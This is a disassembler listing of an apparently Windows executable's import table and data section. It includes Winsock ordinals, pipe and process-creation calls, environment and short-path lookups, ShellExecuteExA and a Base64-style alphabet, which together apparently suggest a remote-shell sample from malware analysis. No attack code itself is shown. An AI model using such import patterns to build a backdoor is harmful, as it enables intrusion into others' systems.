                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall SetPriorityClass(HANDLE hProcess, DWORD d
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hProcess
             DWORD             Stack[0x8]:4   dwPriorityClass
                             806  SetPriorityClass  <<not bound>>
                             PTR_SetPriorityClass_00402058                   XREF[1]:     FUN_00401b50:00401c30(R)
        00402058 60 24 00 00     addr       KERNEL32.DLL::SetPriorityClass
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             LPSTR __stdcall lstrcatA(LPSTR lpString1, LPCSTR lpStrin
             LPSTR             EAX:4          <RETURN>
             LPSTR             Stack[0x4]:4   lpString1
             LPCSTR            Stack[0x8]:4   lpString2
                             944  lstrcatA  <<not bound>>
                             PTR_lstrcatA_0040205c                           XREF[1]:     FUN_00401b50:00401bc5(R)
        0040205c 74 24 00 00     addr       KERNEL32.DLL::lstrcatA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             LPSTR __stdcall lstrcpyA(LPSTR lpString1, LPCSTR lpStrin
             LPSTR             EAX:4          <RETURN>
             LPSTR             Stack[0x4]:4   lpString1
             LPCSTR            Stack[0x8]:4   lpString2
                             953  lstrcpyA  <<not bound>>
                             PTR_lstrcpyA_00402060                           XREF[1]:     FUN_00401b50:00401bbf(R)
        00402060 80 24 00 00     addr       KERNEL32.DLL::lstrcpyA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             DWORD __stdcall GetEnvironmentVariableA(LPCSTR lpName, L
             DWORD             EAX:4          <RETURN>
             LPCSTR            Stack[0x4]:4   lpName
             LPSTR             Stack[0x8]:4   lpBuffer
             DWORD             Stack[0xc]:4   nSize
                             336  GetEnvironmentVariableA  <<not bound>>
                             PTR_GetEnvironmentVariableA_00402064            XREF[1]:     FUN_00401b50:00401ba4(R)
        00402064 8c 24 00 00     addr       KERNEL32.DLL::GetEnvironmentVariableA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             DWORD __stdcall GetShortPathNameA(LPCSTR lpszLongPath, L
             DWORD             EAX:4          <RETURN>
             LPCSTR            Stack[0x4]:4   lpszLongPath
             LPSTR             Stack[0x8]:4   lpszShortPath
             DWORD             Stack[0xc]:4   cchBuffer
                             429  GetShortPathNameA  <<not bound>>
                             PTR_GetShortPathNameA_00402068                  XREF[1]:     FUN_00401b50:00401b84(R)
        00402068 a6 24 00 00     addr       KERNEL32.DLL::GetShortPathNameA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPST
             DWORD             EAX:4          <RETURN>
             HMODULE           Stack[0x4]:4   hModule
             LPSTR             Stack[0x8]:4   lpFilename
             DWORD             Stack[0xc]:4   nSize
                             373  GetModuleFileNameA  <<not bound>>
                             PTR_GetModuleFileNameA_0040206c                 XREF[1]:     FUN_00401b50:00401b67(R)
        0040206c ba 24 00 00     addr       KERNEL32.DLL::GetModuleFileNameA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupI
             void              <VOID>         <RETURN>
             LPSTARTUPINFOA    Stack[0x4]:4   lpStartupInfo
                             431  GetStartupInfoA  <<not bound>>
                             PTR_GetStartupInfoA_00402070                    XREF[1]:     entry:00401dde(R)
        00402070 64 26 00 00     addr       KERNEL32.DLL::GetStartupInfoA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
             HMODULE           EAX:4          <RETURN>
             LPCSTR            Stack[0x4]:4   lpModuleName
                             375  GetModuleHandleA  <<not bound>>
                             PTR_GetModuleHandleA_00402074                   XREF[1]:     entry:00401e02(R)
        00402074 50 26 00 00     addr       KERNEL32.DLL::GetModuleHandleA
        00402078 00              ??         00h
        00402079 00              ??         00h
        0040207a 00              ??         00h
        0040207b 00              ??         00h
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             uint __cdecl _controlfp(uint _NewValue, uint _Mask)
             uint              EAX:4          <RETURN>
             uint              Stack[0x4]:4   _NewValue
             uint              Stack[0x8]:4   _Mask
                             183  _controlfp  <<not bound>>
                             PTR__controlfp_0040207c                         XREF[1]:     _controlfp:00401e66
        0040207c 2a 26 00 00     addr       MSVCRT.DLL::_controlfp
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             uintptr_t __cdecl _beginthread(_StartAddress * _StartAdd
             uintptr_t         EAX:4          <RETURN>
             _StartAddress *   Stack[0x4]:4   _StartAddress
             uint              Stack[0x8]:4   _StackSize
             void *            Stack[0xc]:4   _ArgList
                             165  _beginthread  <<not bound>>
                             PTR__beginthread_00402080                       XREF[1]:     _beginthread:00401cb0
        00402080 28 25 00 00     addr       MSVCRT.DLL::_beginthread
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             int __cdecl _strnicmp(char * _Str1, char * _Str2, size_t
             int               EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Str1
             char *            Stack[0x8]:4   _Str2
             size_t            Stack[0xc]:4   _MaxCount
                             453  _strnicmp  <<not bound>>
                             PTR__strnicmp_00402084                          XREF[1]:     _strnicmp:00401cb6
        00402084 38 25 00 00     addr       MSVCRT.DLL::_strnicmp
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             int __cdecl sprintf(char * _Dest, char * _Format, ...)
             int               EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Dest
             char *            Stack[0x8]:4   _Format
                             690  sprintf  <<not bound>>
                             PTR_sprintf_00402088                            XREF[1]:     sprintf:00401cbc
        00402088 44 25 00 00     addr       MSVCRT.DLL::sprintf
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             long __cdecl atol(char * _Str)
             long              EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Str
                             574  atol  <<not bound>>
                             PTR_atol_0040208c                               XREF[1]:     atol:00401cc2
        0040208c 4e 25 00 00     addr       MSVCRT.DLL::atol
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             char * __cdecl strchr(char * _Str, int _Val)
             char *            EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Str
             int               Stack[0x8]:4   _Val
                             695  strchr  <<not bound>>
                             PTR_strchr_00402090                             XREF[1]:     strchr:00401cc8
        00402090 56 25 00 00     addr       MSVCRT.DLL::strchr
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             void __cdecl free(void * _Memory)
             void              <VOID>         <RETURN>
             void *            Stack[0x4]:4   _Memory
                             606  free  <<not bound>>
                             PTR_free_00402094                               XREF[1]:     free:00401cce
        00402094 60 25 00 00     addr       MSVCRT.DLL::free
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             void * __cdecl malloc(size_t _Size)
             void *            EAX:4          <RETURN>
             size_t            Stack[0x4]:4   _Size
                             657  malloc  <<not bound>>
                             PTR_malloc_00402098                             XREF[1]:     malloc:00401cd4
        00402098 68 25 00 00     addr       MSVCRT.DLL::malloc
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             noreturn void __cdecl _exit(int _Code)
             void              <VOID>         <RETURN>
             int               Stack[0x4]:4   _Code
                             211  _exit  <<not bound>>
                             PTR__exit_0040209c                              XREF[1]:     00401e32(R)
        0040209c 7e 25 00 00     addr       MSVCRT.DLL::_exit
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             int __cdecl _XcptFilter(ulong _ExceptionNum, _EXCEPTION_
             int               EAX:4          <RETURN>
             ulong             Stack[0x4]:4   _ExceptionNum
             _EXCEPTION_POI    Stack[0x8]:4   _ExceptionPtr
                             72  _XcptFilter  <<not bound>>
                             PTR__XcptFilter_004020a0                        XREF[1]:     _XcptFilter:00401e38
        004020a0 86 25 00 00     addr       MSVCRT.DLL::_XcptFilter
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             noreturn void __cdecl exit(int _Code)
             void              <VOID>         <RETURN>
             int               Stack[0x4]:4   _Code
                             585  exit  <<not bound>>
                             PTR_exit_004020a4                               XREF[1]:     entry:00401e12(R)
        004020a4 94 25 00 00     addr       MSVCRT.DLL::exit
                             143  _acmdln  <<not bound>>
                             PTR__acmdln_004020a8                            XREF[1]:     entry:00401da7(R)
        004020a8 9c 25 00 00     addr       MSVCRT.DLL::_acmdln
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             int __cdecl __getmainargs(int * _Argc, char * * * _Argv,
             int               EAX:4          <RETURN>
             int *             Stack[0x4]:4   _Argc
             char * * *        Stack[0x8]:4   _Argv
             char * * *        Stack[0xc]:4   _Env
             int               Stack[0x10]:4  _DoWildCard
             _startupinfo *    Stack[0x14]:4  _StartInfo
                             88  __getmainargs  <<not bound>>
                             PTR___getmainargs_004020ac                      XREF[1]:     entry:00401d8f(R)
        004020ac a6 25 00 00     addr       MSVCRT.DLL::__getmainargs
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined __cdecl initterm()
             undefined         <UNASSIGNED>   <RETURN>
                             271  _initterm  <<not bound>>
                             PTR_initterm_004020b0                           XREF[1]:     initterm:00401e3e
        004020b0 b6 25 00 00     addr       MSVCRT.DLL::initterm
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined __setusermatherr()
             undefined         <UNASSIGNED>   <RETURN>
                             131  __setusermatherr  <<not bound>>
                             PTR___setusermatherr_004020b4                   XREF[1]:     entry:00401d56(R)
        004020b4 c2 25 00 00     addr       MSVCRT.DLL::__setusermatherr
                             157  _adjust_fdiv  <<not bound>>
                             PTR__adjust_fdiv_004020b8                       XREF[1]:     entry:00401d38(R)
        004020b8 d6 25 00 00     addr       MSVCRT.DLL::_adjust_fdiv
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined __p__commode()
             undefined         <UNASSIGNED>   <RETURN>
                             106  __p__commode  <<not bound>>
                             PTR___p__commode_004020bc                       XREF[1]:     entry:00401d2a(R)
        004020bc e6 25 00 00     addr       MSVCRT.DLL::__p__commode
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined __p__fmode()
             undefined         <UNASSIGNED>   <RETURN>
                             111  __p__fmode  <<not bound>>
                             PTR___p__fmode_004020c0                         XREF[1]:     entry:00401d1c(R)
        004020c0 f6 25 00 00     addr       MSVCRT.DLL::__p__fmode
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             void __cdecl __set_app_type(int param_1)
             void              <VOID>         <RETURN>
             int               Stack[0x4]:4   param_1
                             129  __set_app_type  <<not bound>>
                             PTR___set_app_type_004020c4                     XREF[1]:     entry:00401d07(R)
        004020c4 04 26 00 00     addr       MSVCRT.DLL::__set_app_type
                             202  _except_handler3  <<not bound>>
        004020c8 16 26 00 00     addr       MSVCRT.DLL::_except_handler3
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             char * __cdecl _itoa(int _Value, char * _Dest, int _Radix)
             char *            EAX:4          <RETURN>
             int               Stack[0x4]:4   _Value
             char *            Stack[0x8]:4   _Dest
             int               Stack[0xc]:4   _Radix
                             308  _itoa  <<not bound>>
        004020cc 76 26 00 00     addr       MSVCRT.DLL::_itoa
        004020d0 00              ??         00h
        004020d1 00              ??         00h
        004020d2 00              ??         00h
        004020d3 00              ??         00h
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall ShellExecuteExA(SHELLEXECUTEINFOA * pExec
             BOOL              EAX:4          <RETURN>
             SHELLEXECUTEIN    Stack[0x4]:4   pExecInfo
                             265  ShellExecuteExA  <<not bound>>
                             PTR_ShellExecuteExA_004020d4                    XREF[1]:     FUN_00401b50:00401c51(R)
        004020d4 0a 25 00 00     addr       SHELL32.DLL::ShellExecuteExA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             void __stdcall SHChangeNotify(LONG wEventId, UINT uFlags
             void              <VOID>         <RETURN>
             LONG              Stack[0x4]:4   wEventId
             UINT              Stack[0x8]:4   uFlags
             LPCVOID           Stack[0xc]:4   dwItem1
             LPCVOID           Stack[0x10]:4  dwItem2
                             126  SHChangeNotify  <<not bound>>
                             PTR_SHChangeNotify_004020d8                     XREF[1]:     FUN_00401b50:00401c7c(R)
        004020d8 f8 24 00 00     addr       SHELL32.DLL::SHChangeNotify
        004020dc 00              ??         00h
        004020dd 00              ??         00h
        004020de 00              ??         00h
        004020df 00              ??         00h
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             int __stdcall LoadStringA(HINSTANCE hInstance, UINT uID,
             int               EAX:4          <RETURN>
             HINSTANCE         Stack[0x4]:4   hInstance
             UINT              Stack[0x8]:4   uID
             LPSTR             Stack[0xc]:4   lpBuffer
             int               Stack[0x10]:4  cchBufferMax
                             458  LoadStringA  <<not bound>>
                             PTR_LoadStringA_004020e0                        XREF[1]:     FUN_00401240:00401251(R)
        004020e0 de 24 00 00     addr       USER32.DLL::LoadStringA
        004020e4 00              ??         00h
        004020e5 00              ??         00h
        004020e6 00              ??         00h
        004020e7 00              ??         00h
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_9()
             undefined         <UNASSIGNED>   <RETURN>
                             9  Ordinal_9  <<not bound>>
                             PTR_Ordinal_9_004020e8                          XREF[1]:     Ordinal_9:00401e84
        004020e8 09 00 00 80     addr       WS2_32.DLL::Ordinal_9
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_4()
             undefined         <UNASSIGNED>   <RETURN>
                             4  Ordinal_4  <<not bound>>
                             PTR_Ordinal_4_004020ec                          XREF[1]:     Ordinal_4:00401e78
        004020ec 04 00 00 80     addr       WS2_32.DLL::Ordinal_4
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_23()
             undefined         <UNASSIGNED>   <RETURN>
                             23  Ordinal_23  <<not bound>>
                             PTR_Ordinal_23_004020f0                         XREF[1]:     Ordinal_23:00401e90
        004020f0 17 00 00 80     addr       WS2_32.DLL::Ordinal_23
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_115()
             undefined         <UNASSIGNED>   <RETURN>
                             115  Ordinal_115  <<not bound>>
                             PTR_Ordinal_115_004020f4                        XREF[1]:     Ordinal_115:00401e96
        004020f4 73 00 00 80     addr       WS2_32.DLL::Ordinal_115
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_19()
             undefined         <UNASSIGNED>   <RETURN>
                             19  Ordinal_19  <<not bound>>
                             PTR_Ordinal_19_004020f8                         XREF[1]:     Ordinal_19:00401e6c
        004020f8 13 00 00 80     addr       WS2_32.DLL::Ordinal_19
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_11()
             undefined         <UNASSIGNED>   <RETURN>
                             11  Ordinal_11  <<not bound>>
                             PTR_Ordinal_11_004020fc                         XREF[1]:     Ordinal_11:00401e7e
        004020fc 0b 00 00 80     addr       WS2_32.DLL::Ordinal_11
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_16()
             undefined         <UNASSIGNED>   <RETURN>
                             16  Ordinal_16  <<not bound>>
                             PTR_Ordinal_16_00402100                         XREF[1]:     Ordinal_16:00401e72
        00402100 10 00 00 80     addr       WS2_32.DLL::Ordinal_16
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_3()
             undefined         <UNASSIGNED>   <RETURN>
                             3  Ordinal_3  <<not bound>>
                             PTR_Ordinal_3_00402104                          XREF[1]:     Ordinal_3:00401e8a
        00402104 03 00 00 80     addr       WS2_32.DLL::Ordinal_3
        00402108 00              ??         00h
        00402109 00              ??         00h
        0040210a 00              ??         00h
        0040210b 00              ??         00h
        0040210c 00              ??         00h
        0040210d 00              ??         00h
        0040210e 00              ??         00h
        0040210f 00              ??         00h
        00402110 41              ??         41h    A
        00402111 42              ??         42h    B
        00402112 43              ??         43h    C
        00402113 44              ??         44h    D
        00402114 45              ??         45h    E
        00402115 46              ??         46h    F
        00402116 47              ??         47h    G
        00402117 48              ??         48h    H
        00402118 49              ??         49h    I
        00402119 4a              ??         4Ah    J
        0040211a 4b              ??         4Bh    K
        0040211b 4c              ??         4Ch    L
        0040211c 4d              ??         4Dh    M
        0040211d 4e              ??         4Eh    N
        0040211e 4f              ??         4Fh    O
        0040211f 50              ??         50h    P
        00402120 51              ??         51h    Q
        00402121 52              ??         52h    R
        00402122 53              ??         53h    S
        00402123 54              ??         54h    T
        00402124 55              ??         55h    U
        00402125 56              ??         56h    V
        00402126 57              ??         57h    W
        00402127 58              ??         58h    X
        00402128 59              ??         59h    Y
        00402129 5a              ??         5Ah    Z
        0040212a 61              ??         61h    a
        0040212b 62              ??         62h    b
        0040212c 63              ??         63h    c
        0040212d 64              ??         64h    d
        0040212e 65              ??         65h    e
        0040212f 66              ??         66h    f
        00402130 67              ??         67h    g
        00402131 68              ??         68h    h
        00402132 69              ??         69h    i
        00402133 6a              ??         6Ah    j
        00402134 6b              ??         6Bh    k
        00402135 6c              ??         6Ch    l
        00402136 6d              ??         6Dh    m
        00402137 6e              ??         6Eh    n
        00402138 6f              ??         6Fh    o
        00402139 70              ??         70h    p
        0040213a 71              ??         71h    q
        0040213b 72              ??         72h    r
        0040213c 73              ??         73h    s
        0040213d 74              ??         74h    t
        0040213e 75              ??         75h    u
        0040213f 76              ??         76h    v
        00402140 77              ??         77h    w
        00402141 78              ??         78h    x
        00402142 79              ??         79h    y
        00402143 7a              ??         7Ah    z
        00402144 30              ??         30h    0
        00402145 31              ??         31h    1
        00402146 32              ??         32h    2
        00402147 33              ??         33h    3
        00402148 34              ??         34h    4
        00402149 35              ??         35h    5
        0040214a 36              ??         36h    6
        0040214b 37              ??         37h    7
        0040214c 38              ??         38h    8
        0040214d 39              ??         39h    9
        0040214e 2d              ??         2Dh    -
        0040214f 2f              ??         2Fh    /
                             DAT_00402150                                    XREF[1]:     entry:00401cdf(*)
        00402150 ff              ??         FFh
        00402151 ff              ??         FFh
        00402152 ff              ??         FFh
        00402153 ff              ??         FFh
        00402154 18 1e 40 00     addr       LAB_00401e18
        00402158 2c 1e 40 00     addr       LAB_00401e2c
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR                                    *
                             **************************************************************
                             DWORD_0040215c                                  XREF[1]:     00400160(*)
        0040215c d4 21 00 00     ddw        21D4h
        00402160 00 00 00 00     ddw        0h
        00402164 00 00 00 00     ddw        0h
        00402168 d0 24 00 00     ddw        24D0h
        0040216c 00 20 00 00     ddw        2000h
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR                                    *
                             **************************************************************
        00402170 b4 22 00 00     ddw        22B4h
        00402174 00 00 00 00     ddw        0h
        00402178 00 00 00 00     ddw        0h
        0040217c ec 24 00 00     ddw        24ECh
        00402180 e0 20 00 00     ddw        20E0h
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR                                    *
                             **************************************************************
        00402184 a8 22 00 00     ddw        22A8h
        00402188 00 00 00 00     ddw        0h
        0040218c 00 00 00 00     ddw        0h
        00402190 1c 25 00 00     ddw        251Ch
        00402194 d4 20 00 00     ddw        20D4h
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR                                    *
                             **************************************************************
        00402198 50 22 00 00     ddw        2250h
        0040219c 00 00 00 00     ddw        0h
        004021a0 00 00 00 00     ddw        0h
        004021a4 72 25 00 00     ddw        2572h
        004021a8 7c 20 00 00     ddw        207Ch
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR                                    *
                             **************************************************************
        004021ac bc 22 00 00     ddw        22BCh
        004021b0 00 00 00 00     ddw        0h
        004021b4 00 00 00 00     ddw        0h
        004021b8 38 26 00 00     ddw        2638h
        004021bc e8 20 00 00     ddw        20E8h
        004021c0 00              ??         00h
        004021c1 00              ??         00h
        004021c2 00              ??         00h
        004021c3 00              ??         00h
        004021c4 00              ??         00h
        004021c5 00              ??         00h
        004021c6 00              ??         00h
        004021c7 00              ??         00h
        004021c8 00              ??         00h
        004021c9 00              ??         00h
        004021ca 00              ??         00h
        004021cb 00              ??         00h
        004021cc 00              ??         00h
        004021cd 00              ??         00h
        004021ce 00              ??         00h
        004021cf 00              ??         00h
        004021d0 00              ??         00h
        004021d1 00              ??         00h
        004021d2 00              ??         00h
        004021d3 00              ??         00h
        004021d4 e0 22 00 00     ddw        22E0h                                            IMAGE_THUNK_DATA32
        004021d8 ee 22 00 00     ddw        22EEh                                            IMAGE_THUNK_DATA32
        004021dc 04 23 00 00     ddw        2304h                                            IMAGE_THUNK_DATA32
        004021e0 14 23 00 00     ddw        2314h                                            IMAGE_THUNK_DATA32
        004021e4 22 23 00 00     ddw        2322h                                            IMAGE_THUNK_DATA32
        004021e8 2a 23 00 00     ddw        232Ah                                            IMAGE_THUNK_DATA32
        004021ec 3e 23 00 00     ddw        233Eh                                            IMAGE_THUNK_DATA32
        004021f0 4c 23 00 00     ddw        234Ch                                            IMAGE_THUNK_DATA32
        004021f4 62 23 00 00     ddw        2362h                                            IMAGE_THUNK_DATA32
        004021f8 76 23 00 00     ddw        2376h                                            IMAGE_THUNK_DATA32
        004021fc 90 23 00 00     ddw        2390h                                            IMAGE_THUNK_DATA32
        00402200 a2 23 00 00     ddw        23A2h                                            IMAGE_THUNK_DATA32
        00402204 b2 23 00 00     ddw        23B2h                                            IMAGE_THUNK_DATA32
        00402208 c4 23 00 00     ddw        23C4h                                            IMAGE_THUNK_DATA32
        0040220c d6 23 00 00     ddw        23D6h                                            IMAGE_THUNK_DATA32
        00402210 ea 23 00 00     ddw        23EAh                                            IMAGE_THUNK_DATA32
        00402214 f6 23 00 00     ddw        23F6h                                            IMAGE_THUNK_DATA32
        00402218 06 24 00 00     ddw        2406h                                            IMAGE_THUNK_DATA32
        0040221c 12 24 00 00     ddw        2412h                                            IMAGE_THUNK_DATA32
        00402220 1e 24 00 00     ddw        241Eh                                            IMAGE_THUNK_DATA32
        00402224 38 24 00 00     ddw        2438h                                            IMAGE_THUNK_DATA32
        00402228 4c 24 00 00     ddw        244Ch                                            IMAGE_THUNK_DATA32
        0040222c 60 24 00 00     ddw        2460h                                            IMAGE_THUNK_DATA32
        00402230 74 24 00 00     ddw        2474h                                            IMAGE_THUNK_DATA32
        00402234 80 24 00 00     ddw        2480h                                            IMAGE_THUNK_DATA32
        00402238 8c 24 00 00     ddw        248Ch                                            IMAGE_THUNK_DATA32
        0040223c a6 24 00 00     ddw        24A6h                                            IMAGE_THUNK_DATA32
        00402240 ba 24 00 00     ddw        24BAh                                            IMAGE_THUNK_DATA32
        00402244 64 26 00 00     ddw        2664h                                            IMAGE_THUNK_DATA32
        00402248 50 26 00 00     ddw        2650h                                            IMAGE_THUNK_DATA32
        0040224c 00              ??         00h
        0040224d 00              ??         00h
        0040224e 00              ??         00h
        0040224f 00              ??         00h
        00402250 2a 26 00 00     ddw        262Ah                                            IMAGE_THUNK_DATA32
        00402254 28 25 00 00     ddw        2528h                                            IMAGE_THUNK_DATA32
        00402258 38 25 00 00     ddw        2538h                                            IMAGE_THUNK_DATA32
        0040225c 44 25 00 00     ddw        2544h                                            IMAGE_THUNK_DATA32
        00402260 4e 25 00 00     ddw        254Eh                                            IMAGE_THUNK_DATA32
        00402264 56 25 00 00     ddw        2556h                                            IMAGE_THUNK_DATA32
        00402268 60 25 00 00     ddw        2560h                                            IMAGE_THUNK_DATA32
        0040226c 68 25 00 00     ddw        2568h                                            IMAGE_THUNK_DATA32
        00402270 7e 25 00 00     ddw        257Eh                                            IMAGE_THUNK_DATA32
        00402274 86 25 00 00     ddw        2586h                                            IMAGE_THUNK_DATA32
        00402278 94 25 00 00     ddw        2594h                                            IMAGE_THUNK_DATA32
        0040227c 9c 25 00 00     ddw        259Ch                                            IMAGE_THUNK_DATA32
        00402280 a6 25 00 00     ddw        25A6h                                            IMAGE_THUNK_DATA32
        00402284 b6 25 00 00     ddw        25B6h                                            IMAGE_THUNK_DATA32
        00402288 c2 25 00 00     ddw        25C2h                                            IMAGE_THUNK_DATA32
        0040228c d6 25 00 00     ddw        25D6h                                            IMAGE_THUNK_DATA32
        00402290 e6 25 00 00     ddw        25E6h                                            IMAGE_THUNK_DATA32
        00402294 f6 25 00 00     ddw        25F6h                                            IMAGE_THUNK_DATA32
        00402298 04 26 00 00     ddw        2604h                                            IMAGE_THUNK_DATA32
        0040229c 16 26 00 00     ddw        2616h                                            IMAGE_THUNK_DATA32
        004022a0 76 26 00 00     ddw        2676h                                            IMAGE_THUNK_DATA32
        004022a4 00              ??         00h
        004022a5 00              ??         00h
        004022a6 00              ??         00h
        004022a7 00              ??         00h
        004022a8 0a 25 00 00     ddw        250Ah                                            IMAGE_THUNK_DATA32
        004022ac f8 24 00 00     ddw        24F8h                                            IMAGE_THUNK_DATA32
        004022b0 00              ??         00h
        004022b1 00              ??         00h
        004022b2 00              ??         00h
        004022b3 00              ??         00h
        004022b4 de 24 00 00     ddw        24DEh                                            IMAGE_THUNK_DATA32
        004022b8 00              ??         00h
        004022b9 00              ??         00h
        004022ba 00              ??         00h
        004022bb 00              ??         00h
        004022bc 09 00 00 80     ddw        80000009h                                        IMAGE_THUNK_DATA32
        004022c0 04 00 00 80     ddw        80000004h                                        IMAGE_THUNK_DATA32
        004022c4 17 00 00 80     ddw        80000017h                                        IMAGE_THUNK_DATA32
        004022c8 73 00 00 80     ddw        80000073h                                        IMAGE_THUNK_DATA32
        004022cc 13 00 00 80     ddw        80000013h                                        IMAGE_THUNK_DATA32
        004022d0 0b 00 00 80     ddw        8000000Bh                                        IMAGE_THUNK_DATA32
        004022d4 10 00 00 80     ddw        80000010h                                        IMAGE_THUNK_DATA32
        004022d8 03 00 00 80     ddw        80000003h                                        IMAGE_THUNK_DATA32
        004022dc 00              ??         00h
        004022dd 00              ??         00h
        004022de 00              ??         00h
        004022df 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004022e0 2e 00           dw         2Eh
        004022e2 43 6c 6f        ds         "CloseHandle"
                 73 65 48
                 61 6e 64
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004022ee 85 03           dw         385h
        004022f0 57 61 69        ds         "WaitForSingleObject"
                 74 46 6f
                 72 53 69
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402304 49 00           dw         49h
        00402306 43 72 65        ds         "CreateEventA"
                 61 74 65
                 45 76 65
        00402313 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402314 b0 00           dw         B0h
        00402316 45 78 69        ds         "ExitThread"
                 74 54 68
                 72 65 61
        00402321 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402322 49 03           dw         349h
        00402324 53 6c 65        ds         "Sleep"
                 65 70 00
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040232a 0c 01           dw         10Ch
        0040232c 47 65 74        ds         "GetComputerNameA"
                 43 6f 6d
                 70 75 74
        0040233d 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040233e 5f 00           dw         5Fh
        00402340 43 72 65        ds         "CreatePipe"
                 61 74 65
                 50 69 70
        0040234b 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040234c 85 00           dw         85h
        0040234e 44 69 73        ds         "DisconnectNamedPipe"
                 63 6f 6e
                 6e 65 63
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402362 51 03           dw         351h
        00402364 54 65 72        ds         "TerminateProcess"
                 6d 69 6e
                 61 74 65
        00402375 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402376 83 03           dw         383h
        00402378 57 61 69        ds         "WaitForMultipleObjects"
                 74 46 6f
                 72 4d 75
        0040238f 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402390 52 03           dw         352h
        00402392 54 65 72        ds         "TerminateThread"
                 6d 69 6e
                 61 74 65
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004023a2 69 00           dw         69h
        004023a4 43 72 65        ds         "CreateThread"
                 61 74 65
                 54 68 72
        004023b1 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004023b2 60 00           dw         60h
        004023b4 43 72 65        ds         "CreateProcessA"
                 61 74 65
                 50 72 6f
        004023c3 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
